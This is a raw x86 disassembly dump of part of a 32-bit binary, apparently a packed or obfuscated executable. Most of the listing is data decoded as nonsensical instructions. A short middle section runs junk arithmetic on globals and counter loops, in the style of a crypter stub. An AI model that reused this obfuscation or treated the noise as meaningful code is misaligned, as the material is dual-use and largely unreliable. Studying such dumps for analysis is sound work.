  4030f5:	and    ebp,DWORD PTR [esi-0x40]
  4030f8:	mov    al,0x6e
  4030fa:	xor    esp,esp
  4030fc:	inc    esi
  4030fd:	call   ecx
  4030ff:	jge    0x40308b
  403101:	xor    al,0x1e
  403103:	mov    ecx,0xbee021f0
  403108:	je     0x403153
  40310a:	fist   DWORD PTR [edx]
  40310c:	xchg   edx,eax
  40310d:	mov    ah,0xd
  40310f:	or     BYTE PTR [ecx-0x26f39b7d],dl
  403115:	push   ss
  403116:	lahf   
  403117:	xor    al,0x8
  403119:	push   es
  40311a:	mov    al,0x41
  40311c:	cmp    BYTE PTR es:[eax-0x3d],bl
  403120:	scas   al,BYTE PTR es:[edi]
  403121:	repz or dl,0xa2
  403125:	jmp    0x7f2c56fb
  40312a:	enter  0xf7e,0x59
  40312e:	or     ah,BYTE PTR [ebp-0xd]
  403131:	sbb    BYTE PTR [edi],0x38
  403134:	lock jbe 0x40318d
  403137:	dec    esp
  403138:	mov    eax,ds:0xaba0f3cb
  40313d:	inc    ebx
  40313e:	dec    esp
  40313f:	inc    eax
  403140:	in     al,0xaa
  403142:	add    dh,ah
  403144:	int3   
  403145:	repnz arpl WORD PTR [esi-0x15],si
  403149:	enter  0x4dd0,0x4a
  40314d:	retf   
  40314e:	inc    esi
  40314f:	cmp    BYTE PTR [esi],bl
  403151:	mov    ch,0x17
  403153:	push   ss
  403154:	repz mov dl,0xd3
  403157:	call   0xb487:0xdb6cba80
  40315e:	nop
  40315f:	push   ds
  403160:	aad    0x6
  403162:	imul   esp,DWORD PTR es:[esi-0x2ec33a02],0x9f532c74
  40316d:	(bad)  
  40316e:	(bad)  
  40316f:	cli    
  403170:	add    bl,BYTE PTR [edx+0x40]
  403173:	fs jno 0x40316d
  403176:	lahf   
  403177:	fs cdq 
  403179:	inc    eax
  40317a:	or     al,0x1b
  40317c:	or     DWORD PTR [eax+0x6b4d95f3],ebx
  403182:	and    WORD PTR [esi+0x4bd642cc],bx
  403189:	xchg   esp,eax
  40318a:	mov    WORD PTR [eax+0x11],gs
  40318d:	xchg   edi,eax
  40318e:	(bad)  [edx-0x710aa10]
  403194:	jmp    0x40314c
  403196:	cmp    dl,BYTE PTR [ebx-0x765563bb]
  40319c:	jmp    0x40319c
  40319e:	xchg   edx,eax
  40319f:	mov    ebp,DWORD PTR [ebx]
  4031a1:	jg     0x40316c
  4031a3:	adc    eax,0xc64b60b1
  4031a8:	jl     0x4031c6
  4031aa:	sub    al,0x6b
  4031ac:	mov    ebx,0x96a9bd4b
  4031b1:	repz aad 0xcd
  4031b4:	fistp  QWORD PTR [eax+0x12c19a3c]
  4031ba:	and    BYTE PTR [edx-0x1a],al
  4031bd:	sub    BYTE PTR [eax],dh
  4031bf:	test   al,0xbc
  4031c1:	or     DWORD PTR [edx],0x30024b1b
  4031c7:	push   cs
  4031c8:	cmp    bh,BYTE PTR [ebx]
  4031ca:	(bad)  
  4031cb:	and    BYTE PTR [edx],bl
  4031cd:	je     0x40315d
  4031cf:	les    esp,FWORD PTR ds:0x4bd9bcf5
  4031d5:	jno    0x403200
  4031d7:	add    edi,edx
  4031d9:	out    dx,eax
  4031da:	add    ecx,DWORD PTR [ebp-0x56]
  4031dd:	psrlq  mm0,mm1
  4031e0:	mov    ds:0x7cd3be5d,al
  4031e5:	cld    
  4031e6:	(bad)  
  4031e7:	sub    cl,ah
  4031e9:	cwde   
  4031ea:	jmp    0x38cced05
  4031ef:	sub    edi,DWORD PTR [ecx]
  4031f1:	out    dx,al
  4031f2:	jecxz  0x403198
  4031f4:	sbb    BYTE PTR [eax+0x12],dl
  4031f7:	gs mov ch,cl
  4031fa:	xchg   ebp,eax
  4031fb:	test   eax,0x520999ea
  403200:	adc    ebx,ebx
  403202:	lods   eax,DWORD PTR ds:[esi]
  403203:	arpl   WORD PTR [ebx+eax*8-0x678e4701],di
  40320a:	lock les esp,FWORD PTR [ecx]
  40320d:	outs   dx,BYTE PTR ds:[esi]
  40320e:	dec    edx
  40320f:	shl    BYTE PTR [edx-0x27],1
  403212:	jmp    0x40325f
  403214:	in     al,0x49
  403216:	sub    al,BYTE PTR [ebx-0x450190b1]
  40321c:	popf   
  40321d:	jb     0x40328b
  40321f:	lods   eax,DWORD PTR ds:[esi]
  403220:	fs daa 
  403222:	xor    ecx,edi
  403224:	and    BYTE PTR [edx-0x7a],ch
  403227:	call   0xd55899c9
  40322c:	sahf   
  40322d:	rcl    BYTE PTR [esi],1
  40322f:	cmc    
  403230:	xchg   ebp,eax
  403231:	test   DWORD PTR [ecx],edx
  403233:	pop    esp
  403234:	jae    0x4032a0
  403236:	dec    edi
  403237:	adc    eax,0xda4724eb
  40323c:	sbb    BYTE PTR [ecx],bh
  40323e:	jae    0x4031d1
  403240:	inc    eax
  403241:	mov    WORD PTR [ebp-0x5],ss
  403244:	cwde   
  403245:	lds    esi,FWORD PTR [eax+0x33]
  403248:	stos   BYTE PTR es:[edi],al
  403249:	in     al,dx
  40324a:	sub    bl,BYTE PTR [ecx-0x6c]
  40324d:	sub    DWORD PTR [ecx-0x3c133a4e],ebp
  403253:	push   edi
  403254:	push   ebx
  403255:	int3   
  403256:	(bad)  
  403257:	cmp    BYTE PTR [eax+0x1fca6ea8],cl
  40325d:	mov    eax,ds:0xa08f21cb
  403262:	pop    esp
  403263:	bound  eax,QWORD PTR [esi+0x54]
  403266:	dec    dh
  403268:	xchg   ebx,eax
  403269:	inc    edi
  40326a:	cmp    BYTE PTR [ecx+0x76],al
  40326d:	mov    dl,0x99
  40326f:	and    al,BYTE PTR [edx+0x46ae90a1]
  403275:	or     al,0xb8
  403277:	cmp    BYTE PTR [edx+0x33660000],cl
  40327d:	inc    ecx
  40327e:	and    BYTE PTR [ecx+0x3afe],bh
  403284:	and    DWORD PTR ds:0x43467b,0x434643
  40328e:	add    ax,cx
  403291:	mov    ecx,DWORD PTR ds:0x43468f
  403297:	xor    ecx,DWORD PTR ds:0x4345eb
  40329d:	mov    DWORD PTR ds:0x43468f,ecx
  4032a3:	movzx  eax,ax
  4032a6:	mov    ecx,DWORD PTR ds:0x43467f
  4032ac:	xor    DWORD PTR ds:0x434603,ecx
  4032b2:	mov    DWORD PTR [ebp-0xc],eax
  4032b5:	mov    ecx,DWORD PTR ds:0x43468f
  4032bb:	sbb    ecx,DWORD PTR ds:0x4346bf
  4032c1:	mov    DWORD PTR ds:0x43468f,ecx
  4032c7:	mov    BYTE PTR [ebp-0x1],0x7f
  4032cb:	lea    eax,[ebp-0x1]
  4032ce:	or     DWORD PTR ds:0x43468f,0x2e6e
  4032d8:	mov    DWORD PTR [ebp-0x10],eax
  4032db:	and    DWORD PTR ds:0x43470b,edi
  4032e1:	jmp    0x4036d6
  4032e6:	jo     0x4032d7
  4032e8:	inc    edi
  4032e9:	xchg   DWORD PTR [ecx-0x49],eax
  4032ec:	jo     0x4032d7
  4032ee:	jne    0x403366
  4032f0:	xchg   edx,eax
  4032f1:	or     cl,BYTE PTR [esi+0xbb5d88a]
  4032f7:	adc    BYTE PTR [esi+0x7e],bh
  4032fa:	push   esi
  4032fb:	jns    0x40337b
  4032fd:	jle    0x403295
  4032ff:	out    dx,eax
  403300:	xchg   ebx,eax
  403301:	pop    edx
  403302:	dec    eax
  403303:	imul   DWORD PTR [ebx+0xa]
  403306:	imul   ecx,esp,0xea4897bd
  40330c:	xchg   ebp,eax
  40330d:	out    dx,al
  40330e:	cmp    eax,0x33cee8d3
  403313:	xor    esi,DWORD PTR ds:0xb1c90d81
  403319:	out    dx,al
  40331a:	ret    
  40331b:	stos   DWORD PTR es:[edi],eax
  40331c:	pop    edx
  40331d:	je     0x40335b
  40331f:	sbb    dl,BYTE PTR [ebx-0x48cd70bf]
  403325:	cmp    ah,al
  403327:	loop   0x403303
  403329:	push   ds
  40332a:	mov    bl,0x80
  40332c:	arpl   WORD PTR [ebx+esi*2+0x790202],si
  403333:	add    BYTE PTR [ebp+0x67611f8f],0x25
  40333a:	fxch   st(3)
  40333c:	aaa    
  40333d:	das    
  40333e:	out    dx,al
  40333f:	ins    DWORD PTR es:[edi],dx
  403340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403341:	out    0x42,eax
  403343:	xor    DWORD PTR ds:0x3bcb2bd6,0x3215cfd6
  40334d:	pop    esi
  40334e:	dec    eax
  40334f:	and    BYTE PTR [esi],ah
  403351:	test   eax,0x736e3d76
  403356:	adc    al,0xa9
  403358:	pop    ecx
  403359:	lods   eax,DWORD PTR ds:[esi]
  40335a:	jl     0x4033a9
  40335c:	mov    dl,0xc0
  40335e:	das    
  40335f:	pop    ecx
  403360:	adc    eax,0x9e91a3e8
  403365:	ss in  al,0x44
  403368:	xor    al,0x7
  40336a:	idiv   cl
  40336c:	xor    al,0x51
  40336e:	pop    DWORD PTR [esi+0x744c6241]
  403374:	retf   
  403375:	mov    WORD PTR [ecx+0x6c],ds
  403378:	in     eax,dx
  403379:	int3   
  40337a:	es nop
  40337c:	jg     0x4033ce
  40337e:	sbb    dh,BYTE PTR [ebx-0x8735659]
  403384:	inc    esp
  403385:	inc    ebp
  403386:	add    al,0x3a
  403388:	inc    DWORD PTR [esi+0x78]
  40338b:	imul   ecx,DWORD PTR [esi+0x71c302c2],0x77c44ae9
  403395:	xchg   eax,edx
  403397:	aam    0x51
  403399:	loop   0x4033dd
  40339b:	data16 fwait
  40339d:	addr16 cs pop esp
  4033a0:	dec    esp
  4033a1:	int3   
  4033a2:	int    0x9b
  4033a4:	mov    esp,0x55a89fc5
  4033a9:	hlt    
  4033aa:	fwait
  4033ab:	repnz dec eax
  4033ad:	pop    ecx
  4033ae:	push   esi
  4033af:	addr16 push ecx
  4033b1:	adc    al,0x45
  4033b3:	xor    dl,bh
  4033b5:	scas   eax,DWORD PTR es:[edi]
  4033b6:	inc    ebp
  4033b7:	mov    eax,0x5d50e7e8
  4033bc:	or     DWORD PTR [edx-0x11],ecx
  4033bf:	lock xor eax,0x8ae8e1dc
  4033c5:	cs cmp al,0xcc
  4033c8:	dec    ebx
  4033c9:	aam    0x52
  4033cb:	adc    bh,al
  4033cd:	(bad)  
  4033ce:	arpl   WORD PTR [eax+0x71508d41],bx
  4033d4:	ficomp WORD PTR [ebx+0x7858f674]
  4033da:	or     al,0xf3
  4033dc:	jle    0x40339e
  4033de:	ja     0x40345f
  4033e0:	outs   dx,BYTE PTR ds:[esi]
  4033e1:	dec    eax
  4033e2:	stc    
  4033e3:	mov    bl,BYTE PTR [edi-0x3c]
  4033e6:	add    esi,DWORD PTR [edi-0x30b65cb4]
  4033ec:	inc    eax
  4033ed:	push   es
  4033ee:	xchg   ebp,eax
  4033ef:	sub    eax,0x7f65f608
  4033f4:	dec    DWORD PTR [esi+0x7e]
  4033f7:	push   0x2
  4033f9:	sbb    bh,BYTE PTR [ebp+0x3b]
  4033fc:	imul   ebp,DWORD PTR [eax-0x6b],0x2beebf29
  403403:	jb     0x4033a1
  403405:	(bad)  
  403406:	xchg   ebp,eax
  403407:	fsubrp st(6),st
  403409:	and    al,0xf
  40340b:	sbb    BYTE PTR [edx],dh
  40340d:	sbb    al,0xb
  40340f:	mov    edx,0xfd452926
  403414:	jo     0x40342a
  403416:	or     esi,0xea8c148f
  40341c:	fcomp  QWORD PTR [eax-0x346415d7]
  403422:	cwde   
  403423:	push   ds
  403424:	xchg   ebp,eax
  403425:	pop    ds
  403426:	aaa    
  403427:	and    BYTE PTR [esi-0x63],dl
  40342a:	imul   esi,DWORD PTR [eax+ebx*1-0x366877cf],0x45045813
  403435:	jp     0x403458
  403437:	repz mov al,0xc7
  40343a:	mov    dl,0xdf
  40343c:	arpl   WORD PTR [esi],dx
  40343e:	je     0x4033f7
  403440:	enter  0x8fb0,0x5c
  403444:	loopne 0x4033db
  403446:	pushw  ss
  403448:	dec    edi
  403449:	jmp    0x4033ff
  40344b:	aas    
  40344c:	push   edi
  40344d:	sbb    ebx,DWORD PTR [eax+0x11]
  403450:	icebp  
  403451:	inc    eax
  403452:	loop   0x40348e
  403454:	cwde   
  403455:	or     BYTE PTR [eax+0x6665a1d3],al
  40345b:	and    edx,ecx
  40345d:	push   esp
  40345e:	lods   al,BYTE PTR ds:[esi]
  40345f:	stc    
  403460:	cli    
  403461:	inc    ebp
  403462:	stos   BYTE PTR es:[edi],al
  403463:	aam    0x79
  403465:	dec    edi
  403466:	xlat   BYTE PTR ds:[ebx]
  403467:	xchg   esi,eax
  403468:	daa    
  403469:	or     eax,0xf4f205c4
  40346e:	fimul  DWORD PTR [ebp-0x64dbf923]
  403474:	pop    es
  403475:	mov    esi,0x4dd04997
  40347a:	push   edx
  40347b:	mov    dh,0xe9
  40347d:	jns    0x403407
  40347f:	adc    al,0x8e
  403481:	in     eax,0x15
  403483:	xor    edx,DWORD PTR [eax+0x5451ae43]
  403489:	xor    BYTE PTR [ebx-0x5c2ca3a0],al
  40348f:	jae    0x4034cc
  403491:	(bad)  
  403492:	icebp  
  403493:	test   eax,0x84a4e807
  403498:	cmp    ebp,0x2bbf02a2
  40349e:	xor    DWORD PTR [edx+0x723276bc],ebx
  4034a4:	mov    eax,0x4f0e66a3
  4034a9:	jns    0x4034aa
  4034ab:	data16 fcomp DWORD PTR [ecx+0x2c]
  4034af:	add    al,0x13
  4034b1:	pop    ds
  4034b2:	out    0x65,eax
  4034b4:	in     al,dx
  4034b5:	rcr    ebp,cl
  4034b7:	dec    edx
  4034b8:	pop    esi
  4034b9:	xchg   DWORD PTR [ecx],eax
  4034bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034bc:	fsubr  st(2),st
  4034be:	push   ss
  4034bf:	pop    es
  4034c0:	add    al,0x52
  4034c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034c3:	adc    ebx,ebx
  4034c5:	call   0x3a736811
  4034ca:	add    al,bl
  4034cc:	enter  0x9b88,0xbb
  4034d0:	scas   eax,DWORD PTR es:[edi]
  4034d1:	cmp    DWORD PTR [ebx-0x4f],edx
  4034d4:	mov    ecx,0x883eb23a
  4034d9:	push   ss
  4034da:	loope  0x403534
  4034dc:	pusha  
  4034dd:	push   esp
  4034de:	mov    bl,0x97
  4034e0:	or     esp,DWORD PTR [esi]
  4034e2:	iret   
  4034e3:	jbe    0x4034fb
  4034e5:	jl     0x403550
  4034e7:	pop    es
  4034e8:	push   edx
  4034e9:	pusha  
  4034ea:	jne    0x4034ff
  4034ec:	ror    ebx,cl
  4034ee:	or     DWORD PTR [esi],0x70dd38a6
  4034f4:	int    0xae
  4034f6:	cdq    
  4034f7:	inc    ebp
  4034f8:	push   esi
  4034f9:	out    0x9,al
  4034fb:	add    ch,dl
  4034fd:	lock sub esi,esp
  403500:	pop    edi
  403501:	enter  0xf70f,0x50
  403505:	sbb    esp,DWORD PTR [ebx]
  403507:	cli    
  403508:	or     eax,0x179d7ae4
  40350d:	and    al,0x85
  40350f:	pop    es
  403510:	or     BYTE PTR [edi+0xd],0xb8
  403514:	in     eax,dx
  403515:	cmp    al,0x52
  403517:	pop    ebx
  403518:	icebp  
  403519:	mov    dh,0x2a
  40351b:	push   esp
  40351c:	fnstenv [esi]
  40351e:	mov    ecx,0x23c19845
  403523:	lock mov ah,0x1c
  403526:	imul   edi,DWORD PTR [edx-0x209b6460],0xef2da67c
  403530:	or     DWORD PTR [edi+esi*1],edi
  403533:	imul   ecx,esi,0xded1928c
  403539:	inc    edx
  40353a:	jnp    0x40354c
  40353c:	in     al,dx
  40353d:	mov    ds:0x58a828e7,al
  403542:	dec    esi
  403543:	sub    eax,0x83a54f69
  403548:	mov    bh,0xae
  40354a:	lahf   
  40354b:	push   DWORD PTR [eax+edx*4-0x56afb958]
  403552:	inc    ebx
  403553:	stc    
  403554:	out    dx,eax
  403555:	and    ah,0xf3
  403558:	std    
  403559:	fdiv   QWORD PTR [esi+0x54]
  40355c:	(bad)  
  40355d:	repnz int 0xd7
  403560:	mov    bl,0xc3
  403562:	mov    ds:0xf8ef4994,al
  403567:	lahf   
  403568:	(bad)  
  403569:	dec    edi
  40356a:	leave  
  40356b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40356c:	add    BYTE PTR [edx-0x3e],0x13
  403570:	pop    edi
  403571:	mov    ebp,0xdb8d5ca8
  403576:	xchg   ebp,eax
  403577:	stc    
  403578:	enter  0xb8f0,0x39
  40357c:	shl    DWORD PTR ds:0x74233214,cl
  403582:	sub    edx,DWORD PTR [ebx+ecx*1]
  403585:	sub    ah,dl
  403587:	jg     0xa01e8643
  40358d:	sbb    bh,BYTE PTR ds:0x28114773
  403593:	sub    eax,0x764141e0
  403598:	cmp    DWORD PTR [esi-0x65],eax
  40359b:	test   DWORD PTR [edx],edi
  40359d:	pusha  
  40359e:	mov    sp,sp
  4035a1:	adc    bh,bl
  4035a3:	jb     0x4035b1
  4035a5:	in     eax,dx
  4035a6:	jg     0x403559
  4035a8:	add    eax,0xc1824e2b
  4035ad:	sbb    eax,DWORD PTR [edx+0x6b]
  4035b0:	dec    ebp
  4035b1:	mov    edx,0x5f9b0453
  4035b6:	popf   
  4035b7:	push   edx
  4035b8:	push   ebx
  4035b9:	aam    0x33
  4035bb:	push   ecx
  4035bc:	sbb    dh,BYTE PTR [ebp+0x5d]
  4035bf:	add    ebx,DWORD PTR [edx+0x1c]
  4035c2:	mov    al,0x13
  4035c4:	dec    eax
  4035c5:	sub    eax,0xada2560c
  4035ca:	(bad)  
  4035cb:	sti    
  4035cc:	or     bh,bl
  4035ce:	mov    bl,0xc6
  4035d0:	ja     0x403603
  4035d2:	pop    es
  4035d3:	sbb    eax,0xaa342116
  4035d8:	sub    eax,0x8acf3943
  4035dd:	bound  ecx,QWORD PTR [eax+0x4d412dc8]
  4035e3:	xor    al,0xd3
  4035e5:	sbb    al,0xe9
  4035e7:	jnp    0x403597
  4035e9:	ret    0x4bef
  4035ec:	in     al,dx
  4035ed:	mov    ds:0xb068ad47,eax
  4035f2:	push   ebx
  4035f3:	retf   
  4035f4:	addr16 mov ch,0x8f
  4035f7:	hlt    
  4035f8:	ret    0x1dcf
  4035fb:	idiv   esi
  4035fd:	mov    ebp,0x9b86b7c8
  403602:	gs sti 
  403604:	dec    esi
  403605:	popf   
  403606:	or     ch,BYTE PTR [ecx-0x19a2774d]
  40360c:	mov    WORD PTR [bp+di+0x5f],?
  403610:	data16 sti 
  403612:	in     al,0xc9
  403614:	inc    ebx
  403615:	push   ebx
  403616:	adc    ecx,ebp
  403618:	outs   dx,BYTE PTR ds:[esi]
  403619:	outs   dx,BYTE PTR ds:[esi]
  40361a:	outs   dx,BYTE PTR ds:[esi]
  40361b:	dec    ebx
  40361c:	dec    edi
  40361d:	dec    ecx
  40361e:	mov    dl,0x17
  403620:	add    ah,bl
  403622:	push   eax
  403623:	icebp  
  403624:	sub    dl,BYTE PTR [edx+0x6861b4ba]
  40362a:	(bad)  
  40362b:	fisubr DWORD PTR [edx-0x781e762c]
  403631:	shl    ebx,0xd3
  403634:	inc    edi
  403635:	pop    esp
  403636:	jo     0x403638
  403638:	sbb    esi,DWORD PTR [ebx]
  40363a:	xchg   edx,eax
  40363b:	mov    edi,0x2cfe0f67
  403640:	fisttp QWORD PTR [ecx+0x3c]
  403643:	add    dl,dl
  403645:	xchg   edx,eax
  403646:	pop    ecx
  403647:	xor    esp,esp
  403649:	adc    al,0x93
  40364b:	ds scas al,BYTE PTR es:[edi]
  40364d:	call   0xfe00:0x4dc99aad
  403654:	(bad)  
  403655:	xchg   esp,eax
  403656:	sub    dl,BYTE PTR [ebp-0xa09cb86]
  40365c:	and    ebx,ecx
  40365e:	mov    BYTE PTR [ecx-0xbaf2b15],dl
  403664:	clc    
  403665:	push   edi
  403666:	pop    ebx
  403667:	pop    edx
  403668:	jle    0x403626
  40366a:	inc    ebp
  40366b:	jae    0x4036ae
  40366d:	lds    edx,FWORD PTR [ecx-0xb6ebbcd]
  403673:	jecxz  0x403611
  403675:	cmp    BYTE PTR [ebx],dl
  403677:	mov    es:0xd99d1a43,eax
  40367d:	outs   dx,BYTE PTR ds:[si]
  40367f:	cwde   
  403680:	jo     0x403654
  403682:	push   edx
  403683:	and    al,0xc5
  403685:	pusha  
  403686:	fmul   QWORD PTR ds:0x5abc614c
  40368c:	xor    ebp,DWORD PTR [ebp+ebx*2-0x4fad62a6]
  403693:	pop    eax
  403694:	inc    esi
  403695:	jno    0x4036e3
  403697:	jno    0x4036c4
  403699:	push   esp
  40369a:	fcomp  DWORD PTR [ecx+0x503f19d8]
  4036a0:	adc    DWORD PTR [ecx],ebx
  4036a2:	test   eax,0x37b84479
  4036a7:	loopne 0x4036a9
  4036a9:	xor    BYTE PTR [edx],al
  4036ab:	or     eax,ebp
  4036ad:	jo     0x4036e4
  4036af:	iret   
  4036b0:	add    eax,0x4c9660b7
  4036b5:	mov    eax,0x43521af9
  4036ba:	dec    eax
  4036bb:	dec    ecx
  4036bc:	jae    0x403690
  4036be:	mov    cl,0x6d
  4036c0:	stos   DWORD PTR es:[edi],eax
  4036c1:	and    eax,DWORD PTR [edi-0x42]
  4036c4:	pop    esi
  4036c5:	sbb    eax,0x1638e6af
  4036ca:	imul   edi,DWORD PTR [edx+0x5aba9adc],0xe51c3301
  4036d4:	inc    eax
  4036d5:	test   DWORD PTR [edx+0xd8bff45],0x4345eb
  4036df:	sbb    ecx,DWORD PTR ds:0x434707
  4036e5:	mov    DWORD PTR ds:0x4345eb,ecx
  4036eb:	mov    ecx,DWORD PTR [ebp-0x10]
  4036ee:	sbb    DWORD PTR ds:0x434713,0x563b
  4036f8:	xor    al,0x44
  4036fa:	add    DWORD PTR ds:0x4345fb,0xe00
  403704:	sub    al,0x3a
  403706:	or     DWORD PTR ds:0x4345f7,0x434707
  403710:	mov    BYTE PTR [ecx],al
  403712:	xor    DWORD PTR ds:0x434677,ecx
  403718:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  40371f:	and    DWORD PTR ds:0x434687,0x0
  403729:	jmp    0x40373d
  40372e:	xor    ecx,ecx
  403730:	xor    ecx,DWORD PTR ds:0x434687
  403736:	inc    ecx
  403737:	mov    DWORD PTR ds:0x434687,ecx
  40373d:	cmp    DWORD PTR ds:0x434687,0x18
  403744:	jae    0x40382f
  40374a:	cmp    DWORD PTR ds:0x434687,0x20
  403751:	jne    0x40376a
  403757:	push   0x446b
  40375c:	push   DWORD PTR [ebp-0xc]
  40375f:	push   0x8d79
  403764:	call   DWORD PTR ds:0x413278
  40376a:	jmp    0x40372e
  40376f:	mov    DWORD PTR ds:0x4346cb,0x14
  403779:	cmp    DWORD PTR ds:0x4346cb,0x0
  403780:	je     0x40382f
  403786:	cmp    DWORD PTR ds:0x4346cb,0xa
  40378d:	jne    0x4037a6
  403793:	push   0x695b
  403798:	push   0x23be
  40379d:	push   DWORD PTR [ebp-0x18]
  4037a0:	call   DWORD PTR ds:0x41327c
  4037a6:	cmp    DWORD PTR ds:0x4346cb,0xb
  4037ad:	jne    0x4037c0
  4037b3:	mov    ecx,DWORD PTR ds:0x4346cb
  4037b9:	dec    ecx
  4037ba:	mov    DWORD PTR ds:0x4346cb,ecx
  4037c0:	mov    ecx,DWORD PTR ds:0x4346cb
  4037c6:	dec    ecx
  4037c7:	mov    DWORD PTR ds:0x4346cb,ecx
  4037cd:	jmp    0x403779
  4037d2:	mov    DWORD PTR ds:0x4345e7,0x1c
  4037dc:	cmp    DWORD PTR ds:0x4345e7,0x0
  4037e3:	je     0x40382f
  4037e9:	cmp    DWORD PTR ds:0x4345e7,0xc
  4037f0:	jne    0x403801
  4037f6:	push   0x434849
  4037fb:	call   DWORD PTR ds:0x413334
  403801:	cmp    DWORD PTR ds:0x4345e7,0xd
  403808:	jne    0x40381b
  40380e:	mov    ecx,DWORD PTR ds:0x4345e7
  403814:	dec    ecx
  403815:	mov    DWORD PTR ds:0x4345e7,ecx
  40381b:	mov    ecx,DWORD PTR ds:0x4345e7
  403821:	dec    ecx
  403822:	mov    DWORD PTR ds:0x4345e7,ecx
  403828:	jmp    0x4037dc
  40382d:	xor    ecx,ecx
  40382f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  403836:	adc    eax,eax
  403838:	mov    eax,DWORD PTR [ebp-0x8]
  40383b:	mov    ecx,0x7510851
  403840:	push   esi
  403841:	adc    DWORD PTR ds:0x434687,edi
  403847:	xor    eax,ecx
  403849:	inc    DWORD PTR ds:0x43470b
  40384f:	mov    esi,0x327299
  403854:	sub    DWORD PTR ds:0x43464f,0x3953
  40385e:	add    eax,esi
  403860:	jmp    0x40387d
  403865:	not    DWORD PTR ds:0x434643
  40386b:	mov    dl,BYTE PTR [ebp-0x1]
  40386e:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403872:	mov    DWORD PTR ds:0x43464b,0x4a72
  40387c:	inc    eax
  40387d:	cmp    eax,0x40
  403880:	jb     0x403865
  403886:	mov    edx,DWORD PTR [ebp-0x8]
  403889:	mov    eax,DWORD PTR [ebp-0xc]
  40388c:	xor    edx,ecx
  40388e:	add    edx,esi
  403890:	cmp    edx,eax
  403892:	je     0x403ccd
  403898:	push   ebx
  403899:	push   edi
  40389a:	mov    edi,DWORD PTR [ebp+0x8]
  40389d:	mov    eax,0x8a38
  4038a2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4038a7:	mov    edi,0x3afe
  4038ac:	jmp    0x403ca1
  4038b1:	sbb    DWORD PTR [edx+0x31],0x6d5dfd54
  4038b8:	jae    0x4038d9
  4038ba:	(bad)  
  4038bb:	out    dx,al
  4038bc:	xchg   esi,eax
  4038bd:	push   edx
  4038be:	int    0xea
  4038c0:	push   esp
  4038c1:	arpl   WORD PTR [ebx],dx
  4038c3:	jle    0x403943
  4038c5:	push   esi
  4038c6:	jns    0x403946
  4038c8:	jle    0x4038bf
  4038ca:	or     al,0x6d
  4038cc:	mov    DWORD PTR [eax+0x607fc0b0],edx
  4038d2:	or     BYTE PTR [ecx-0x43],0x70
  4038d6:	sbb    al,0x7e
  4038d8:	dec    edx
  4038d9:	sub    BYTE PTR [ebx],dl
  4038db:	sub    dl,BYTE PTR [esi+0x1f]
  4038de:	fmul   st,st(4)
  4038e0:	push   ss
  4038e1:	jecxz  0x403888
  4038e3:	dec    edi
  4038e4:	ret    0x9927
  4038e7:	dec    ebp
  4038e8:	sbb    BYTE PTR [edx+0x73a16167],bl
  4038ee:	aaa    
  4038ef:	scas   al,BYTE PTR es:[edi]
  4038f0:	enter  0xfb71,0x6c
  4038f4:	fmul   DWORD PTR [ebp-0x315a26d3]
  4038fa:	repnz pushf 
  4038fc:	int3   
  4038fd:	add    BYTE PTR ds:0xea1233de,cl
  403903:	hlt    
  403904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403905:	and    edx,ecx
  403907:	rol    BYTE PTR [eax+0x70a90f3b],0x43
  40390e:	mov    ebp,0x8b79cf60
  403913:	mov    bl,0x53
  403915:	or     DWORD PTR [ebx+0x4802d889],0xffffffc3
  40391c:	lods   eax,DWORD PTR ds:[esi]
  40391d:	jns    0x40399d
  40391f:	into   
  403920:	std    
  403921:	mov    esi,0xf0ae40f
  403926:	and    BYTE PTR [esi+0x1],dh
  403929:	(bad)
  40392e:	sahf   
  40392f:	test   ah,ch
  403931:	or     DWORD PTR [edi+0xee9c4dd],0xffffffb6
  403938:	mov    ah,dl
  40393a:	push   esp
  40393b:	inc    eax
  40393c:	mov    ebx,0x46624a10
  403941:	inc    edx
  403942:	sub    al,0x16
  403944:	pop    ss
  403945:	cwde   
  403946:	retf   
  403947:	fldenv [ecx+0x29]
  40394a:	ins    BYTE PTR es:[edi],dx
  40394b:	xor    dh,dh
  40394d:	xchg   BYTE PTR [esi-0x454200cc],cl
  403953:	inc    edi
  403954:	xor    DWORD PTR [eax-0x6d694b07],ebx
  40395a:	in     eax,dx
  40395b:	cmp    al,0xb1
  40395d:	lock addr16 stc 
  403960:	lea    eax,[esi]
  403962:	mov    DWORD PTR [ecx+0x57fd9cf2],edi
  403968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403969:	frstor [edi-0x4198f1e4]
  40396f:	hlt    
  403970:	in     eax,0x8
  403972:	cwde   
  403973:	jg     0x4038f6
  403975:	fmul   DWORD PTR [esi]
  403977:	xchg   edx,eax
  403978:	test   BYTE PTR [ebx],cl
  40397a:	out    dx,eax
  40397b:	jmp    0x7bdd:0x3e9c1af8
  403982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403983:	scas   al,BYTE PTR es:[edi]
  403984:	xor    esi,eax
  403986:	push   ss
  403987:	(bad)  
  403988:	push   eax
  403989:	out    dx,al
  40398a:	jmp    0xa3446486
  40398f:	daa    
  403990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403991:	test   BYTE PTR [edi+0x55],ch
  403994:	sti    
  403995:	xchg   edx,eax
  403996:	cdq    
  403997:	leave  
  403998:	mov    bl,0x41
  40399a:	cmp    ebx,ecx
  40399c:	dec    esi
  40399d:	or     esi,DWORD PTR [ebx+0x7a48d280]
  4039a3:	aad    0xe1
  4039a5:	je     0x4039ce
  4039a7:	jae    0x40395b
  4039a9:	ja     0x4039d3
  4039ab:	dec    ebp
  4039ac:	push   edi
  4039ad:	or     ebp,DWORD PTR [esi]
  4039af:	push   es
  4039b0:	ins    BYTE PTR es:[edi],dx
  4039b1:	jl     0x403a0f
  4039b3:	and    ecx,ebx
  4039b5:	(bad)  
  4039b7:	(bad)  
  4039b8:	popf   
  4039b9:	mov    edi,0x8cd504ad
  4039be:	inc    edx
  4039bf:	in     al,dx
  4039c0:	iret   
  4039c1:	inc    edx
  4039c2:	jmp    0x403948
  4039c4:	ins    BYTE PTR es:[edi],dx
  4039c5:	pop    esp
